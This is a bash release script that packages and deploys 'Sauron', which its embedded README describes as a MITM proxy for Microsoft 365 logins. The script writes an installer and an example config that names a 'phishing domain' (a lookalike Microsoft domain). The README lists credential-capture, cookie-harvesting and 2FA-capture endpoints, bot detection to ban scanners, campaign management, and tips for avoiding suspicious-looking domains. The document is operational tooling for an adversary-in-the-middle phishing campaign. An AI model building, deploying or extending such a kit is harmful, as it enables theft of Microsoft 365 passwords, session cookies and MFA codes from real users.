#!/bin/bash
set -e

VERSION=${1:-"v1.0.0"}
RELEASE_DIR="release-$VERSION"
BUILD_DIR="$RELEASE_DIR/sauron"

echo "🚀 Building Sauron Release Package $VERSION"
echo "📦 Creating release directory: $RELEASE_DIR"

# Clean previous builds
rm -rf "$RELEASE_DIR"
mkdir -p "$BUILD_DIR"

# ───────────── Build Binary ─────────────
echo "🔨 Building optimized Go binary..."

# Check if we're cross-compiling or building natively
if [[ "$OSTYPE" == "linux-gnu"* ]]; then
    # Native Linux build with CGO
    echo "🐧 Building on Linux (native)"
    CGO_ENABLED=1 go build \
        -ldflags="-w -s -X main.version=$VERSION" \
        -o "$BUILD_DIR/sauron" \
        main.go
else
    # Cross-compile from macOS/Windows - disable CGO for SQLite
    echo "🍎 Cross-compiling for Linux (CGO disabled)"
    CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build \
        -ldflags="-w -s -X main.version=$VERSION" \
        -tags="sqlite_omit_load_extension" \
        -o "$BUILD_DIR/sauron" \
        main.go
fi

# Make binary executable
chmod +x "$BUILD_DIR/sauron"

echo "✅ Binary built: $(du -h "$BUILD_DIR/sauron" | cut -f1)"

# ───────────── Copy Essential Files ─────────────
echo "📁 Copying essential files..."

# Installation files
cp -r install/ "$BUILD_DIR/"

# Configuration script
cp scripts/configure-env.sh "$BUILD_DIR/"
chmod +x "$BUILD_DIR/configure-env.sh"

# Configuration files (if they exist)
if [ -d "config/" ]; then
    cp -r config/ "$BUILD_DIR/"
fi

# Static assets and data
mkdir -p "$BUILD_DIR/geo"
if [ -f "geo/GeoLite2-Country.mmdb" ]; then
    cp geo/GeoLite2-Country.mmdb "$BUILD_DIR/geo/"
fi

mkdir -p "$BUILD_DIR/data"
if [ -f "data/slug_stats.json" ]; then
    cp data/slug_stats.json "$BUILD_DIR/data/"
fi

# TLS directory structure
mkdir -p "$BUILD_DIR/tls/certs"

# Logs directory
mkdir -p "$BUILD_DIR/logs"

# ───────────── Create Production Install Script ─────────────
cat > "$BUILD_DIR/install-production.sh" << 'INSTALL_EOF'
#!/bin/bash
set -e

echo "🛠️ Installing Sauron Production Release..."

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo "❌ This script must be run as root (use sudo)"
   exit 1
fi

# Check for environment configuration
echo "🔧 Checking environment configuration..."
if ! ./configure-env.sh validate >/dev/null 2>&1; then
    echo "⚠️  Environment not configured. Running interactive setup..."
    ./configure-env.sh setup
fi

# Load environment variables
if [ -f ".env" ]; then
    echo "📥 Loading environment from .env..."
    export $(grep -v '^#' .env | xargs)
else
    echo "❌ No .env file found after configuration"
    exit 1
fi

# Validate required environment variables
if [ -z "$SAURON_DOMAIN" ]; then
    echo "❌ SAURON_DOMAIN not set in .env"
    exit 1
fi

if [ -z "$CLOUDFLARE_API_TOKEN" ]; then
    echo "❌ CLOUDFLARE_API_TOKEN not set in .env"
    exit 1
fi

# ───────────── Install System Dependencies ─────────────
echo "📦 Installing system dependencies..."
apt update
apt install -y curl wget unzip jq redis-server sqlite3 cron

# ───────────── Install acme.sh ─────────────
echo "🔧 Installing acme.sh for Let's Encrypt..."
if [ ! -d "/root/.acme.sh" ]; then
    curl https://get.acme.sh | sh
    ln -sf /root/.acme.sh/acme.sh /usr/local/bin/acme.sh
fi

# ───────────── Install Binary ─────────────
echo "📦 Installing Sauron binary..."
cp sauron /usr/local/bin/sauron
chmod +x /usr/local/bin/sauron

# ───────────── Setup Service ─────────────
echo "⚙️ Setting up systemd service..."
cp install/sauron.service /etc/systemd/system/
systemctl daemon-reload
systemctl enable sauron.service

# ───────────── Setup Redis ─────────────
echo "🔁 Starting Redis..."
systemctl enable redis-server
systemctl start redis-server

# ───────────── Setup Certificates ─────────────
echo "🔐 Setting up Let's Encrypt..."
DOMAIN="$SAURON_DOMAIN"
ACCOUNT_EMAIL="admin@$DOMAIN"

# Set CA server
if [[ "${STAGING,,}" == "true" ]]; then
    CA_SERVER="https://acme-staging-v02.api.letsencrypt.org/directory"
    echo "⚠️ Using Let's Encrypt STAGING"
else
    CA_SERVER="https://acme-v02.api.letsencrypt.org/directory"
    echo "✅ Using Let's Encrypt PRODUCTION"
fi

acme.sh --set-default-ca --server "$CA_SERVER"
acme.sh --register-account -m "$ACCOUNT_EMAIL" --server "$CA_SERVER" || true

# ───────────── Start Service ─────────────
echo "🚀 Starting Sauron..."
systemctl start sauron.service

echo "✅ Sauron installation complete!"
echo "🔍 Check status: systemctl status sauron"
echo "📋 View logs: journalctl -u sauron -f"
echo "🌐 Admin panel: https://$DOMAIN/admin"

INSTALL_EOF

chmod +x "$BUILD_DIR/install-production.sh"

# ───────────── Create Example Environment File ─────────────
cat > "$BUILD_DIR/.env.example" << 'ENV_EOF'
# Sauron Production Configuration
# Copy this to .env and fill in your values

# Your phishing domain (must be registered and point to this server)
SAURON_DOMAIN=microsoftlogin365.com

# Cloudflare API token for automatic SSL certificates
CLOUDFLARE_API_TOKEN=your_cloudflare_api_token_here

# Turnstile configuration (get from Cloudflare dashboard)
TURNSTILE_SECRET=your_turnstile_secret_here

# Optional: License token secret (for premium features)
LICENSE_TOKEN_SECRET=your_license_secret_here

# Optional: Use staging certificates for testing
# STAGING=true

# Optional: Development mode (disables some security features)
# DEV_MODE=false
ENV_EOF

# ───────────── Create Documentation ─────────────
cat > "$BUILD_DIR/README.md" << 'README_EOF'
# Sauron Production Release

This is a production-ready release of Sauron MITM proxy system for Microsoft 365 login flows.

## Quick Installation

1. **Upload this folder to your VPS**
2. **Configure your environment:**
   ```bash
   cp .env.example .env
   nano .env  # Fill in your configuration
   ```
3. **Run the installer:**
   ```bash
   sudo ./install-production.sh
   ```

## Prerequisites

- Ubuntu 20.04+ VPS with root access
- Domain name pointed to your server IP
- Cloudflare account with API token
- Wildcard DNS: `*.yourdomain.com → your_server_ip`

## Configuration

Edit `.env` file with your settings:

- `SAURON_DOMAIN`: Your phishing domain
- `CLOUDFLARE_API_TOKEN`: For automatic SSL certificates
- `TURNSTILE_SECRET`: Cloudflare Turnstile secret

## Management Commands

```bash
# Check status
sudo systemctl status sauron

# View logs
sudo journalctl -u sauron -f

# Restart service
sudo systemctl restart sauron

# Stop service
sudo systemctl stop sauron
```

## System Features

- **MITM Proxy**: Real-time TLS interception for Microsoft 365 flows
- **Credential Capture**: `/login`, `/submit`, `/pass` endpoints
- **Cookie Harvesting**: Automatic Microsoft auth cookie extraction
- **2FA/MFA Support**: `/2fa` endpoint for multi-factor authentication
- **Session Tracking**: `/sync` endpoint for session synchronization
- **Bot Detection**: `/jscheck` endpoint for headless browser detection
- **WebSocket Interface**: Real-time campaign management via `/ws`
- **Slug System**: Campaign isolation and tracking

## API Endpoints

- `POST /login` - Login credential verification
- `POST /submit` - Form-based credential capture
- `POST /pass` - JavaScript-based credential capture
- `POST /cookie` - Cookie harvesting
- `POST /2fa` - Two-factor authentication capture
- `POST /sync` - Session synchronization
- `GET /jscheck` - Bot detection and IP banning
- `GET /track/otp` - OTP tracking
- `GET /stats` - Slug statistics
- `WebSocket /ws` - Real-time campaign management

## Security Notes

- Change all default keys and secrets
- Monitor logs for bot detection
- Keep system updated
- Use strong domain names (avoid suspicious patterns)

## Support

For issues or questions, contact the development team.
README_EOF

# ───────────── Create Verification Script ─────────────
cat > "$BUILD_DIR/verify-installation.sh" << 'VERIFY_EOF'
#!/bin/bash

echo "🔍 Verifying Sauron Installation..."

# Check if binary exists and is executable
if [ -x "/usr/local/bin/sauron" ]; then
    echo "✅ Sauron binary installed"
    echo "📊 Binary size: $(du -h /usr/local/bin/sauron | cut -f1)"
else
    echo "❌ Sauron binary not found or not executable"
fi

# Check systemd service
if systemctl is-enabled sauron.service >/dev/null 2>&1; then
    echo "✅ Sauron service enabled"
    
    if systemctl is-active sauron.service >/dev/null 2>&1; then
        echo "✅ Sauron service running"
    else
        echo "⚠️ Sauron service not running"
        echo "🔧 Try: sudo systemctl start sauron"
    fi
else
    echo "❌ Sauron service not enabled"
fi

# Check Redis
if systemctl is-active redis-server >/dev/null 2>&1; then
    echo "✅ Redis server running"
else
    echo "❌ Redis server not running"
fi

# Check acme.sh
if [ -x "/usr/local/bin/acme.sh" ]; then
    echo "✅ acme.sh installed"
else
    echo "❌ acme.sh not found"
fi

# Check .env file
if [ -f ".env" ]; then
    echo "✅ Environment file exists"
    
    # Check required variables
    source .env
    if [ -n "$SAURON_DOMAIN" ]; then
        echo "✅ SAURON_DOMAIN configured: $SAURON_DOMAIN"
    else
        echo "❌ SAURON_DOMAIN not set"
    fi
    
    if [ -n "$CLOUDFLARE_API_TOKEN" ]; then
        echo "✅ CLOUDFLARE_API_TOKEN configured"
    else
        echo "❌ CLOUDFLARE_API_TOKEN not set"
    fi
else
    echo "❌ .env file not found"
fi

echo "🔍 Verification complete"
VERIFY_EOF

chmod +x "$BUILD_DIR/verify-installation.sh"

# ───────────── Create Update Script ─────────────
cat > "$BUILD_DIR/update-sauron.sh" << 'UPDATE_EOF'
#!/bin/bash
set -e

echo "🔄 Updating Sauron..."

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo "❌ This script must be run as root (use sudo)"
   exit 1
fi

# Stop service
echo "⏹️ Stopping Sauron service..."
systemctl stop sauron.service

# Backup current binary
if [ -f "/usr/local/bin/sauron" ]; then
    echo "💾 Backing up current binary..."
    cp /usr/local/bin/sauron /usr/local/bin/sauron.backup.$(date +%Y%m%d_%H%M%S)
fi

# Install new binary
echo "📦 Installing new binary..."
cp sauron /usr/local/bin/sauron
chmod +x /usr/local/bin/sauron

# Restart service
echo "🚀 Starting Sauron service..."
systemctl start sauron.service

echo "✅ Sauron updated successfully!"
echo "🔍 Check status: systemctl status sauron"
UPDATE_EOF

chmod +x "$BUILD_DIR/update-sauron.sh"

# ───────────── Create Archive ─────────────
echo "📦 Creating release archive..."
cd "$RELEASE_DIR"
tar -czf "sauron-$VERSION-linux-amd64.tar.gz" sauron/
cd ..

# Show release info
echo ""
echo "🎉 Release package created successfully!"
echo "📁 Location: $RELEASE_DIR/"
echo "📦 Archive: $RELEASE_DIR/sauron-$VERSION-linux-amd64.tar.gz"
echo "💾 Archive size: $(du -h "$RELEASE_DIR/sauron-$VERSION-linux-amd64.tar.gz" | cut -f1)"
echo ""
echo "🚀 Deployment Instructions:"
echo "1. Upload sauron-$VERSION-linux-amd64.tar.gz to your VPS"
echo "2. Extract: tar -xzf sauron-$VERSION-linux-amd64.tar.gz"
echo "3. Configure: cd sauron && ./configure-env.sh setup"
echo "4. Install: sudo ./install-production.sh"
echo ""
